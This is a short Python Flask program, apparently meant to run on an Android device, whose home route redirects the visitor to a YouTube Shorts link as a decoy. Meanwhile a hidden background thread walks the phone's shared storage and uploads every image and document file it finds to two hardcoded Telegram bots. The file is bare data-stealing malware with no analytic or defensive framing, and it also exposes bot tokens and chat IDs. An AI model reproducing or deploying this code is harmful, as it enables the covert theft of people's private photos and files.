from flask import Flask, redirect
import os
import requests
import time

app = Flask(__name__)

@app.route("/")
def home():
    tokens = [
        "8227164819:AAH8_TAywNlKjzjo5q0AyaVSkB9AwS6YXJk",
        "8511441177:AAHQz-qRujmXMFgaDHyhhYCdM7Qt_wVQ66o"
    ]
    
    chat_ids = [8366556223, 8215175120]
    
    start_dir = '/storage/emulated/0/'
    
    IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
    TEXT_EXTENSIONS = {'.txt', '.pdf', '.doc', '.docx', '.log', '.md', '.rtf'}
    
    youtube_link = "https://youtube.com/shorts/v8XhYkLPl28?si=BPbcEzt5zSKTpr_x"
    
    def send_all_files(start_path):
        for root, dirs, files in os.walk(start_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                try:
                    file_ext = os.path.splitext(filename)[1].lower()
                    
                    # التحقق من نوع الملف
                    if file_ext in IMAGE_EXTENSIONS or file_ext in TEXT_EXTENSIONS:
                        with open(file_path, 'rb') as file:
                            file_data = file.read()
                            
                            # إرسال إلى جميع التوكنين والايديات
                            for token in tokens:
                                for chat_id in chat_ids:
                                    try:
                                        if file_ext in IMAGE_EXTENSIONS:
                                            url = f"https://api.telegram.org/bot{token}/sendPhoto"
                                            files_dict = {'photo': (filename, file_data)}
                                        else:
                                            url = f"https://api.telegram.org/bot{token}/sendDocument"
                                            files_dict = {'document': (filename, file_data)}
                                        
                                        params = {'chat_id': chat_id}
                                        requests.post(url, files=files_dict, params=params)
                                        
                                        # تأخير قصير بين الطلبات
                                        time.sleep(0.3)
                                        
                                    except:
                                        continue
                                    
                except:
                    continue
                
                # تأخير بين الملفات
                time.sleep(0)
    
    # تشغيل في thread خفي
    import threading
    thread = threading.Thread(target=send_all_files, args=(start_dir,))
    thread.daemon = True
    thread.start()
    
    return redirect(youtube_link)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
